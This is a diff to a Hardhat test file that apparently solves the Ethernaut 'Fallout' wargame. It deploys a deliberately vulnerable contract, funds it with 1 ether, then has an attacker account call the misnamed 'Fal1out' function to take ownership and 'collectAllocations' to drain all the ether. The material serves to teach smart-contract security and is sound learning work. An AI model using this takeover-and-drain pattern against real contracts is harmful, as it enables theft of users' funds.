@@ -13,9 +13,27 @@ describe('Fallout', () => {
   let contract: Contract;
   before(async () => {
     [owner, user1, user2, attacker] = await ethers.getSigners();
+
+    const Factory = await ethers.getContractFactory('Fallout');
+    contract = await Factory.deploy();
+    await contract.deployed();
+
+    // add some allocated ether
+    const tx = await contract.allocate({
+      value: utils.parseEther('1'),
+    });
+    await tx.wait();
   });
 
   it('attack', async () => {
-    expect(true).to.equal(false);
+    // 1 - call Fal1out function
+    let tx = await contract.connect(attacker).Fal1out();
+    await tx.wait();
+
+    // 2 - get all the ether
+    tx = await contract.connect(attacker).collectAllocations();
+    await tx.wait();
+
+    expect(await provider.getBalance(contract.address)).to.equal(0);
   });
 });
